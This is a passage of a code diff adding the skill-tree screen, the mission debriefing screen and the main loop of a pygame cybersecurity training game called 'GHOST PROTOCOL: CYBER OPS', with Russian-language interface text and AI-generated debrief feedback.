+        elif not all(r in gs.skills for r in reqs):
+            need = [next((x[1] for x in SKILLS if x[0]==r), r) for r in reqs]
+            self.notif = f"Требует: {', '.join(need)}"
+        else:
+            gs.skills.add(sid)
+            gs.sp -= cost
+            self.notif = f"Изучен: «{s[1]}» (−{cost} SP)"
+        self.notif_t = 0.0
+
+    def update(self, dt):
+        self.t += dt
+        self.notif_t += dt
+
+    def draw(self):
+        surf = self.surf
+        surf.fill(P["bg"])
+        T(surf, "ДЕРЕВО НАВЫКОВ", 22, P["pink"], SW//2, 28, True, cx=True)
+        T(surf, f"Доступно SP: {self.gs.sp}", 13, P["yellow"], SW//2, 56, cx=True)
+
+        # Ветки
+        for bname, bx in SKILL_BRANCH_X.items():
+            col = {"Разведка": P["cyan"], "Атака": P["red"], "Постэксплойт": P["purple"]}[bname]
+            T(surf, bname, 13, col, bx, 80, bold=True, cx=True)
+
+        # Рёбра
+        for s in SKILLS:
+            sx, sy = skill_pos(s[0])
+            for req in s[6]:
+                rx2, ry2 = skill_pos(req)
+                pygame.draw.line(surf, P["border"], (sx,sy), (rx2,ry2), 2)
+
+        # Узлы
+        for s in SKILLS:
+            sid, name, branch, desc, cost, _, reqs = s
+            sx, sy = skill_pos(sid)
+            owned     = sid in self.gs.skills
+            can_buy   = (self.gs.sp >= cost and
+                         all(r in self.gs.skills for r in reqs) and
+                         not owned)
+            hov_this  = self.hov == sid
+
+            if owned:
+                col = P["green"]; bcol = P["dkgrn"]
+            elif can_buy:
+                col = P["yellow"]; bcol = P["dkgray"]
+            else:
+                col = P["gray"]; bcol = P["dkgray"]
+
+            pygame.draw.circle(surf, bcol, (sx,sy), self.NR)
+            pygame.draw.circle(surf, col, (sx,sy), self.NR, 2)
+            if hov_this:
+                pygame.draw.circle(surf, P["bordhi"], (sx,sy), self.NR+3, 2)
+            T(surf, name, 9, col, sx, sy-5, cx=True)
+            T(surf, f"{cost} SP", 8, P["gray"], sx, sy+7, cx=True)
+            if owned:
+                T(surf, "✓", 10, P["green"], sx, sy-16, cx=True)
+
+            if hov_this:
+                self._draw_tooltip(sid, name, branch, desc, cost, reqs, sx, sy)
+
+        # Уведомление
+        if self.notif and self.notif_t < 2.8:
+            ok_flag = "изучен" in self.notif.lower()
+            nc = P["green"] if ok_flag else P["red"]
+            bc = (5,30,10) if ok_flag else (30,5,8)
+            box(surf, pygame.Rect(SW//2-240, SH-168, 480, 44), bc, nc)
+            T(surf, self.notif, 12, nc, SW//2, SH-146, cx=True)
+
+        self.back.draw(surf)
+        surf.blit(crt(), (0,0))
+
+    def _draw_tooltip(self, sid, name, branch, desc, cost, reqs, sx, sy):
+        TW = 320; fn = F(11)
+        desc_lines = wrap_text(desc, TW-20, 10)
+        TH = 18 + 22 + 18 + len(desc_lines)*18 + 16
+        tx = sx + self.NR + 14
+        if tx + TW > SW - 8:
+            tx = sx - self.NR - TW - 14
+        ty = max(8, min(sy - TH//2, SH - TH - 8))
+        box(surf := self.surf, pygame.Rect(tx,ty,TW,TH), P["panel2"], P["bordhi"])
+        y = ty + 8
+        T(surf, name, 12, P["white"], tx+8, y, True, max_w=TW-16); y += 22
+        T(surf, f"Ветка: {branch}   Цена: {cost} SP", 10, P["gray"], tx+8, y, max_w=TW-16); y += 18
+        pygame.draw.line(surf, P["border"], (tx+4,y),(tx+TW-4,y),1); y += 4
+        for ln in desc_lines:
+            T(surf, ln, 10, P["white"], tx+8, y, max_w=TW-16); y += 18
+        if reqs:
+            rn = [next((x[1] for x in SKILLS if x[0]==r), r) for r in reqs]
+            T(surf, f"Требует: {', '.join(rn)}", 9, P["yellow"], tx+8, y, max_w=TW-16)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ЭКРАН ДЕБРИФИНГА
+# ═══════════════════════════════════════════════════════════════
+class DebriefScreen:
+    def __init__(self, surf, gs: GameState, ai: "AI"):
+        self.surf = surf; self.gs = gs; self.t = 0.0; self.ai_text = ""
+        mid = gs.active_mid; m = MISSIONS[mid]
+        dr  = gs.threat
+        fl  = sum(1 for k, v in gs.objectives.items() if not v)
+        self.score = max(0, int((1-dr)*100 - fl*15 - gs.hints_used*5))
+        self._phase_cb: Optional[Callable] = None
+
+        prompt = (
+            f"Операция {'УСПЕШНА' if gs.all_done() else 'ЧАСТИЧНО ВЫПОЛНЕНА'}. "
+            f"Выполнено: {sum(v for v in gs.objectives.values())}/{len(gs.objectives)}. "
+            f"Угроза: {dr*100:.0f}%. Оценка: {self.score}/100. "
+            f"Подсказок: {gs.hints_used}. "
+            "Дай обучающий дебрифинг 3 предложения: что правильно, что улучшить."
+        )
+        ai.oracle(prompt, lambda t: setattr(self, "ai_text", t or ""), gs)
+
+        bx = SW//2
+        self.b_menu  = Btn(bx-250, SH-82, 220, 52, "☰ Главное меню",
+                           P["panel2"], P["border"], P["white"], 14)
+        self.b_skill = Btn(bx+30,  SH-82, 220, 52, f"★ Навыки ({gs.sp} SP)",
+                           P["dkgray"], P["purple"], P["white"], 13)
+        self.b_retry = Btn(bx-110, SH-82, 220, 52, "↩ Повторить",
+                           P["dkred"], P["red"], P["white"], 14)
+        self.b_menu .cb(self._menu)
+        self.b_skill.cb(self._skills)
+        self.b_retry.cb(self._retry)
+
+    def set_phase_cb(self, cb): self._phase_cb = cb
+    def _menu(self):
+        save_progress(self.gs.to_dict())
+        if self._phase_cb: self._phase_cb("menu")
+    def _skills(self):
+        if self._phase_cb: self._phase_cb("skills")
+    def _retry(self):
+        self.gs.start_mission(self.gs.active_mid)
+        if self._phase_cb: self._phase_cb("play")
+
+    def on(self, ev):
+        self.b_menu.on(ev); self.b_skill.on(ev); self.b_retry.on(ev)
+
+    def update(self, dt): self.t += dt
+
+    def draw(self):
+        surf = self.surf
+        surf.fill((3, 5, 12))
+        col   = P["green"] if self.gs.all_done() else P["orange"]
+        title = "ОПЕРАЦИЯ ЗАВЕРШЕНА" if self.gs.all_done() else "ОПЕРАЦИЯ ЧАСТИЧНО ВЫПОЛНЕНА"
+        pa    = abs(math.sin(self.t * 2.2))
+        pc    = tuple(int(c*pa + 26*(1-pa)) for c in col)
+        T(surf, title, 36, pc, SW//2, 52, True, cx=True)
+        T(surf, MISSIONS[self.gs.active_mid]["code"], 15, P["gray"], SW//2, 98, cx=True)
+
+        # Статистика
+        box(surf, pygame.Rect(SW//2-390, 124, 780, 130), P["panel"], P["border"])
+        sc_col = P["green"] if self.score >= 70 else P["orange"] if self.score >= 40 else P["red"]
+        stats = [
+            ("УГРОЗА",    f"{self.gs.threat*100:.1f}%",
+             P["green"] if self.gs.threat < 0.5 else P["red"]),
+            ("КРЕДИТЫ",   f"+{MISSIONS[self.gs.active_mid]['reward']['cr']:,}", P["yellow"]),
+            ("ОЦЕНКА",    f"{self.score}/100",   sc_col),
+            ("ПОДСКАЗКИ", str(self.gs.hints_used), P["cyan"]),
+        ]
+        for i, (lbl, val, vc) in enumerate(stats):
+            sx = SW//2 - 380 + i*196
+            T(surf, lbl, 10, P["gray"], sx, 142)
+            T(surf, val, 20, vc, sx, 162, True)
+
+        # Цели
+        T(surf, "ЦЕЛИ ОПЕРАЦИИ:", 13, P["cyan"], SW//2-390, 278, True)
+        oy = 302
+        for obj in MISSIONS[self.gs.active_mid]["objectives"]:
+            k = obj["key"]; v = self.gs.objectives.get(k, False)
+            T(surf, f"  {'[✓]' if v else '[✗]'}  {obj['text']}", 13,
+              P["green"] if v else P["red"], SW//2-380, oy, max_w=780)
+            oy += 26
+
+        # Дебрифинг ИИ
+        T(surf, "ДЕБРИФИНГ ORACLE:", 13, P["tai"], SW//2-390, 462, True)
+        if self.ai_text:
+            for ji, ln in enumerate(wrap_text(self.ai_text, 95, 12)):
+                T(surf, ln, 12, P["tai"], SW//2-380, 484+ji*22, max_w=780)
+        else:
+            bl = "..." if int(self.t*3)%3 < 2 else "   "
+            T(surf, f"Получение дебрифинга от ORACLE{bl}", 12, P["tai"], SW//2-380, 484)
+
+        self.b_menu.draw(surf); self.b_skill.draw(surf); self.b_retry.draw(surf)
+        surf.blit(crt(), (0, 0))
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ПРИЛОЖЕНИЕ
+# ═══════════════════════════════════════════════════════════════
+class App:
+    def __init__(self):
+        pygame.init()
+        pygame.display.set_caption(
+            "GHOST PROTOCOL: CYBER OPS  v5.0  —  Educational Cybersecurity Trainer")
+        self.surf  = pygame.display.set_mode((SW, SH))
+        self.clock = pygame.time.Clock()
+        self.gs    = GameState()
+        self.ai    = AI()
+
+        saved = load_progress()
+        if saved:
+            self.gs.from_dict(saved)
+
+        self._phase  = "boot"
+        self._screen = BootScreen(self.surf)
+
+    def _set_phase(self, ph: str):
+        self._phase = ph
+        gs = self.gs; ai = self.ai; surf = self.surf
+        scr: Any
+        if ph == "boot":
+            scr = BootScreen(surf)
+        elif ph == "menu":
+            scr = SelectScreen(surf, gs, ai)
+            scr.set_phase_cb(self._set_phase)
+        elif ph == "play":
+            scr = GameScreen(surf, gs, ai)
+            scr.set_phase_cb(self._set_phase)
+        elif ph == "skills":
+            scr = SkillScreen(surf, gs)
+            scr.set_phase_cb(self._set_phase)
+        elif ph == "debrief":
+            scr = DebriefScreen(surf, gs, ai)
+            scr.set_phase_cb(self._set_phase)
+        else:
+            return
+        self._screen = scr
+
+    def run(self):
+        while True:
+            dt = min(self.clock.tick(FPS) / 1000.0, 0.05)
+            for ev in pygame.event.get():
+                if ev.type == pygame.QUIT:
+                    save_progress(self.gs.to_dict())
+                    pygame.quit(); sys.exit(0)
+                if hasattr(self._screen, "on"):
+                    self._screen.on(ev)
+
+            if self._phase == "boot" and getattr(self._screen, "done", False):
+                self._set_phase("menu")
+
+            if hasattr(self._screen, "update"):
+                self._screen.update(dt)
+            if hasattr(self._screen, "draw"):
+                self._screen.draw()
+
+            draw_flash(self.surf, dt)
+            pygame.display.flip()
+
+
+def main():
+    app = App()
+    app.run()
+
+
+if __name__ == "__main__":
+    main()
+
